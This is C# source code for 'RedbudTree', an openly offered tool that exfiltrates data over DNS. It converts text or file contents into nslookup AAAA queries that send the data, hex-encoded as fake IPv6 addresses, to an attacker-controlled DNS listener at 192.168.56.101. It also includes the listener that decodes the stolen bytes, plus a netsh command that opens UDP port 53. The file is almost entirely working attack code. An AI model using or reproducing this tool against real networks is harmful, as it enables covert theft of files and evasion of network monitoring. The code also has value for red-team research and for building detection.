using System;
using System.Collections.Generic;
using System.Net;
using System.Net.Sockets;
using System.Text;

namespace RedbudTree
{
    class Program
    {
        /// <summary>
        /// RedbudTree v1.0 , IPv6 DNS Request Listener (UDP Port 53)
        /// Detecting Exfiltration DATA via IPv6 DNS AAAA Record Requests
        /// 
        /// DNS IPv6 Requests tested by nslookup command in Win2008 R2 and Kali linux.
        /// RedbudTree Listener Mode tested in Win2008 R2 + .NET Framework 2.0
        /// 
        /// for using "Listener Mode" UDP Port 53 should be opened before using this tool.         
        /// windows command for opening UDP port 53 is :  
        /// netsh advfirewall firewall add rule name="UDP 53" dir=in action=allow protocol=UDP localport=53
        /// 
        /// [!] Syntax 1: Creating Exfiltration DATA via IPv6 Address and Nslookup
        /// [!] Syntax 1: RedbudTree.exe "AAAA" "Text"
        /// [!] Example1: RedbudTree.exe AAAA "this is my test"
        /// 
        /// [!] Syntax 2: Creating Exfiltration DATA via IPv6 Address and Nslookup by Text Files
        /// [!] Syntax 2: RedbudTree.exe "AAAA" "FILE" "TextFile.txt"
        /// [!] Example2: RedbudTree.exe AAAA FILE "TextFile.txt"
        /// 
        /// [!] Syntax 3: RedbudTree with Listening Mode
        /// [!] Syntax 3: RedbudTree.exe        
        /// 
        /// </summary>

        public static int counter = 0;
        public static UdpClient UDP_53_Init = new UdpClient(53);

        public static void Async_UDP_Data_Receive(IAsyncResult AsyncResult)
        {                     
            IPEndPoint LocalIP_UdpPort53 = new IPEndPoint(IPAddress.Any,53);
            byte[] UDP_Rec_Bytes = UDP_53_Init.EndReceive(AsyncResult, ref LocalIP_UdpPort53);            
                      
            bool isIPV6 = false;           
            string UDP_DATA = Encoding.ASCII.GetString(UDP_Rec_Bytes);
            if (UDP_DATA.ToUpper().Contains("IP6"))
            {
                isIPV6 = true;
                counter++;
                Console.WriteLine("[{1}] [{0}] IPv6 DNS Request Received : ", DateTime.Now.ToString(),counter.ToString());
                Console.ForegroundColor = ConsoleColor.DarkCyan;
                /// Debug Mode
                //Console.WriteLine(BitConverter.ToString(bytes));               
            }
            if (isIPV6)
            {
                Console.ForegroundColor = ConsoleColor.DarkGreen;
                Console.Write("[{0}] IPv6 DNS Bytes is :  ", DateTime.Now.ToString());

                char[] Temp = new char[UDP_DATA.Length];
                int c = 0;                
                foreach (char item in UDP_DATA)
                {
                    if (Convert.ToInt32(item) > 16)
                    {
                        Console.ForegroundColor = ConsoleColor.Green;
                        Console.Write(item);
                        Temp[c] = item;                        
                    }
                    else
                    {
                        Console.ForegroundColor = ConsoleColor.DarkGreen;
                        Console.Write(item);
                    }
                    c++;
                }
                int cc = Temp.Length;
                bool init = false;
                Console.WriteLine();
                Console.ForegroundColor = ConsoleColor.DarkGreen;
                Console.Write("[{0}] IPv6 DNS Request is : ", DateTime.Now.ToString());
                Console.ForegroundColor = ConsoleColor.Green;
                string _Raw = "";
                int BreakTime = 0;
                for (int jj = cc - 1; jj >= 0; jj--)
                {
                    if (init)
                    {                        
                        Console.Write(Temp[jj]);
                        if (Temp[jj] != '\0') _Raw += Temp[jj];
                    }
                    if (Temp[jj] == 'i') init = true;                   
                    if (BreakTime > 75) break;
                    BreakTime++;
                }
                
                /// Debug
                //Console.WriteLine("\n" + _Raw);

                byte[] RAW = new byte[16];
                int kk = 0;
                for (int k = 0; k < _Raw.Length / 2;)
                {
                    RAW[k] = byte.Parse(_Raw.Substring(kk, 2), System.Globalization.NumberStyles.HexNumber);
                    k++;
                    kk++;
                    kk++;
                }
                Console.ForegroundColor = ConsoleColor.DarkGreen;
                Console.WriteLine();
                Console.Write("[{0}] Dumping DATA from this IPv6 Address :", DateTime.Now.ToString());
                Console.ForegroundColor = ConsoleColor.Green;
                Console.Write(UTF8Encoding.ASCII.GetChars(RAW));
                Console.WriteLine();                
            }
           
           
            Console.ForegroundColor = ConsoleColor.Gray;         
        }
        public static void Create_IPv6_Address(string input_Exfil_String_DATA ,bool _isFile)
        {
           
            try
            {
                string ExfiltrationText = "";
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine("Your Target (UDP Port 53) Listener IPv4 Address is 192.168.56.101 you can change it manually.");

                if (_isFile)
                {
                    Console.WriteLine("Your Exfiltration Nslookup Commands for File \"{0}\" are:", input_Exfil_String_DATA);
                    byte[] FileBytes = System.IO.File.ReadAllBytes(input_Exfil_String_DATA);
                    ExfiltrationText = UTF8Encoding.ASCII.GetString(FileBytes);
                }
                if(!_isFile)
                {
                    Console.WriteLine("Your Exfiltration Nslookup Commands are:");
                    byte[] TextBytes = UnicodeEncoding.ASCII.GetBytes(input_Exfil_String_DATA);
                    ExfiltrationText = UTF8Encoding.ASCII.GetString(TextBytes);
                }

                Console.ForegroundColor = ConsoleColor.Gray;
                Console.WriteLine();              
                byte[] b = new byte[ExfiltrationText.Length];
                int i = 0;
                int c = 1;
                int cc = 1;
                Console.Write("nslookup -type=aaaa ");
                foreach (char item in ExfiltrationText)
                {
                    b[i] = Convert.ToByte(item);

                    if (cc > 2) { Console.Write(":"); cc = 1; }
                    Console.Write(string.Format("{0:x2}", b[i]));
                    if (c == 16)
                    {
                        Console.Write(" 192.168.56.101 | find \"\"");
                        Console.WriteLine();
                        Console.Write("nslookup -type=aaaa ");
                        c = 0;
                        cc = 0;
                    }

                    i++;
                    c++;
                    cc++;
                }

                Console.WriteLine();
            }
            catch (Exception omg)
            {
                Console.WriteLine(omg.Message);
            }
        }
        static void Main(string[] args)
        {
            /// Exfiltration and uploading DATA by Sending IPv6 DNS Request to Attacker DNS Server 
            /// in this case you can Uploading DATA by IPv6 Addresses      
            Console.ForegroundColor = ConsoleColor.DarkGray;
            Console.WriteLine();
            Console.WriteLine("RedbudTree , IPv6 DNS Request Listener (UDP Port 53)");
            Console.WriteLine("Detecting Exfiltration DATA via IPv6 DNS AAAA Record Requests");
            Console.ForegroundColor = ConsoleColor.Gray;
            Console.WriteLine("Published by Damon Mohammadbagher Oct-Nov 2017");
            Console.WriteLine();
            if (args.Length >= 1 && args[0].ToUpper() == "HELP")
            {
                Console.WriteLine();
                Console.ForegroundColor = ConsoleColor.DarkCyan;
                Console.WriteLine("[!] Syntax 1: Creating Exfiltration DATA via IPv6 Address and Nslookup");
                Console.ForegroundColor = ConsoleColor.Cyan;
                Console.WriteLine("[!] Syntax 1: RedbudTree.exe \"AAAA\" \"Text\"");
                Console.WriteLine("[!] Example1: RedbudTree.exe AAAA \"this is my test\"");
                Console.WriteLine();
                Console.ForegroundColor = ConsoleColor.DarkCyan;
                Console.WriteLine("[!] Syntax 2: Creating Exfiltration DATA via IPv6 Address and Nslookup by Text Files");
                Console.ForegroundColor = ConsoleColor.Cyan;
                Console.WriteLine("[!] Syntax 2: RedbudTree.exe \"AAAA\" \"FILE\" \"TextFile.txt\"");
                Console.WriteLine("[!] Example2: RedbudTree.exe AAAA FILE \"TextFile.txt\"");
                Console.WriteLine();
                Console.ForegroundColor = ConsoleColor.DarkCyan;
                Console.WriteLine("[!] Syntax 3: Listening Mode");
                Console.ForegroundColor = ConsoleColor.Cyan;
                Console.WriteLine("[!] Syntax 3: RedbudTree.exe ");
                Console.WriteLine("[!] Example3: RedbudTree.exe ");
                Console.WriteLine();
                Console.ForegroundColor = ConsoleColor.Gray;
            }
            else if (args.Length == 2 && args[0].ToUpper() == "AAAA")
            {
                try
                {
                    Create_IPv6_Address(args[1], false);
                    Console.WriteLine();
                }
                catch (Exception omg)
                {
                    Console.WriteLine(omg.Message);
                }
            }
            else if (args.Length == 3 && args[0].ToUpper() == "AAAA" && args[1].ToUpper() == "FILE")
            {
                try
                {
                    Create_IPv6_Address(args[2], true);
                    Console.WriteLine();
                }
                catch (Exception omg)
                {
                    Console.WriteLine(omg.Message);
                }
            }
            else if (args.Length == 0)
            {
                
                Console.ForegroundColor = ConsoleColor.Yellow;
                Console.WriteLine("[!] UDP Port 53 Listening Mode");
                Console.ForegroundColor = ConsoleColor.Gray;
                System.Threading.Thread Exec = new System.Threading.Thread(new System.Threading.ThreadStart(T));
                Exec.Priority = System.Threading.ThreadPriority.AboveNormal;
                Exec.Start();               
            }
            else
            {
                Console.WriteLine();
                Console.ForegroundColor = ConsoleColor.DarkCyan;
                Console.WriteLine("[!] Syntax 1: Creating Exfiltration DATA via IPv6 Address and Nslookup");
                Console.ForegroundColor = ConsoleColor.Cyan;
                Console.WriteLine("[!] Syntax 1: RedbudTree.exe \"AAAA\" \"Text\"");
                Console.WriteLine("[!] Example1: RedbudTree.exe AAAA \"this is my test\"");
                Console.WriteLine();
                Console.ForegroundColor = ConsoleColor.DarkCyan;
                Console.WriteLine("[!] Syntax 2: Creating Exfiltration DATA via IPv6 Address and Nslookup by Text Files");
                Console.ForegroundColor = ConsoleColor.Cyan;
                Console.WriteLine("[!] Syntax 2: RedbudTree.exe \"AAAA\" \"FILE\" \"TextFile.txt\"");
                Console.WriteLine("[!] Example2: RedbudTree.exe AAAA FILE \"TextFile.txt\"");
                Console.WriteLine();
                Console.ForegroundColor = ConsoleColor.DarkCyan;
                Console.WriteLine("[!] Syntax 3: Listening Mode");
                Console.ForegroundColor = ConsoleColor.Cyan;
                Console.WriteLine("[!] Syntax 3: RedbudTree.exe ");
                Console.WriteLine("[!] Example3: RedbudTree.exe ");
                Console.WriteLine();
                Console.ForegroundColor = ConsoleColor.Gray;
            }
        }
        public static void T()
        {
            while (true)
            {
                try
                {
                    UDP_53_Init.BeginReceive(Async_UDP_Data_Receive, new object());
                    System.Threading.Thread.Sleep(1000);
                }
                catch (Exception omg)
                {
                    Console.WriteLine("[!] Maybe you need to this command before Running RedBudTree \"Listening Mode\" :");
                    Console.WriteLine("[!] netsh advfirewall firewall add rule name=\"UDP 53\" dir=in action=allow protocol=UDP localport=53");
                    Console.WriteLine("[X] " + omg.Message);
                }
            }
        }
    }
}

